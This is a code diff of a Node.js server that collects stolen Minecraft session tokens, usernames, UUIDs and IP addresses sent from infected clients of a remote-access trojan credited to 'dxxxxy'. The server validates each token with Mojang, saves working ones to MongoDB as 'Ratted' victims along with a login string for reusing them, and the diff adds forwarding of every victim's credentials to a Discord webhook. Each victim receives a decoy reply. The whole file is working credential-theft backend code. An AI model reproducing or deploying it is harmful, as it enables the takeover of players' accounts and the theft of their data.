@@ -1,12 +1,17 @@
+//config params
+const
+    usingDiscord = true,
+    usingMongoDB = true
+
 //setup
 require('dotenv').config()
-const { post } = require("axios").default
-const express = require("express")
-const mongoose = require("mongoose")
-const helmet = require("helmet")
-const app = express()
-const Ratted = require("./models/Ratted")
-const port = process.env.PORT || 80
+const { post } = require("axios").default,
+    express = require("express"),
+    mongoose = require("mongoose"),
+    helmet = require("helmet"),
+    app = express(),
+    Ratted = require("./models/Ratted"),
+    port = process.env.PORT || 80
 
 //plugins
 app.use(helmet()) //secure
@@ -14,17 +19,19 @@ app.use(express.json()) //parse json
 app.use(express.urlencoded({ extended: true }))
 
 //database connection
-mongoose.connect(process.env.DB)
-mongoose.connection.on("connected", () => console.log("Mongoose connection successfully opened!"))
-mongoose.connection.on("err", err => console.error(`Mongoose connection error:\n${err.stack}`))
-mongoose.connection.on("disconnected", () => console.log("Mongoose connection disconnected"))
+if (usingMongoDB) {
+    mongoose.connect(process.env.DB)
+    mongoose.connection.on("connected", () => console.log("Mongoose connection successfully opened!"))
+    mongoose.connection.on("err", err => console.error(`Mongoose connection error:\n${err.stack}`))
+    mongoose.connection.on("disconnected", () => console.log("Mongoose connection disconnected"))
+}
 
-// log the json of a simple post
+//main route, post to this
 app.post("/", (req, res) => {
     //happens if the request does not contain all the required fields, aka someones manually posting to the server
-    if (!req.body.username || !req.body.uuid || !req.body.token || !req.body.ip) return console.log("Missing fields")
+    if (!req.body.username || !req.body.uuid || !req.body.token || !req.body.ip) return console.log("Invalid post request")
 
-    //validate the token
+    //validate the token with mojang (should mostly always hit, unless someone sends well formatted json but with bad data)
     post("https://sessionserver.mojang.com/session/minecraft/join", JSON.stringify({
         accessToken: req.body.token,
         selectedProfile: req.body.uuid,
@@ -36,34 +43,58 @@ app.post("/", (req, res) => {
     })
 
     .then(response => {
-        //mojangs way of saying its good
-        if (response.status == 204) {
-            //create a Ratted object with mongoose schema and save it
-            new Ratted({
-                username: req.body.username,
-                uuid: req.body.uuid,
-                token: req.body.token,
-                ip: req.body.ip,
-                timestamp: new Date(),
-                //string to login using https://github.com/DxxxxY/TokenAuth
-                tokenAuth: `${req.body.username}:${req.body.uuid}:${req.body.token}`
-            }).save(err => {
-                //errors with the database
-                if (err) console.log("Error saving to database: ", err)
-            })
+        if (response.status == 204) { //mojangs way of saying its good
+            if (usingMongoDB) {
+                //create a Ratted object with mongoose schema and save it
+                new Ratted({
+                    username: req.body.username,
+                    uuid: req.body.uuid,
+                    token: req.body.token,
+                    ip: req.body.ip,
+                    timestamp: new Date(),
 
-            console.log(`${req.body.username} has been ratted!`, req.body)
+                    //(optional) string to login using https://github.com/DxxxxY/TokenAuth
+                    tokenAuth: `${req.body.username}:${req.body.uuid}:${req.body.token}`
+                }).save(err => {
+                    if (err) console.log(`Error while saving to database\n${err}`)
+                })
+            }
+
+            if (usingDiscord) {
+                //send to discord webhook
+                post(process.env.WEBHOOK, JSON.stringify({
+                    content: "@everyone", //ping whoever u want
+                    embeds: [{
+                        title: `Ratted ${req.body.username}`,
+                        description: `Username: \`${req.body.username}\`\nUUID: \`${req.body.uuid}\`\nToken: \`${req.body.token}\`\nIP: \`${req.body.ip}\`\nTokenAuth: \`${req.body.username}:${req.body.uuid}:${req.body.token}\``,
+                        color: 5814783,
+                        footer: {
+                            text: "R.A.T by dxxxxy"
+                        },
+                        timestamp: new Date()
+                    }],
+                    attachments: []
+                }), {
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                }).catch(err => {
+                    console.log(`Error while sending to webhook\n${err}`)
+                })
+            }
+
+            console.log(`${req.body.username} has been ratted!\n${JSON.parse(req.body)}`)
         }
     })
 
     .catch(err => {
-        //could happen if the auth server is down OR invalid information is passed in the body
-        console.log("Response Error: " + err.response.data.error)
+        //could happen if the auth server is down OR if invalid information is passed in the body
+        console.log(`Error checking data with mojang\n${err}`)
     })
 
-    //change this to whatev u want, but make sure to send a response
+    //change this to whatever u want, but make sure to send a response
     res.send("Logged in to SBE server")
 })
 
 //create server
-app.listen(port, () => console.log(`Listening at http://localhost:${port}`))
+app.listen(port, () => console.log(`Listening at port ${port}`))
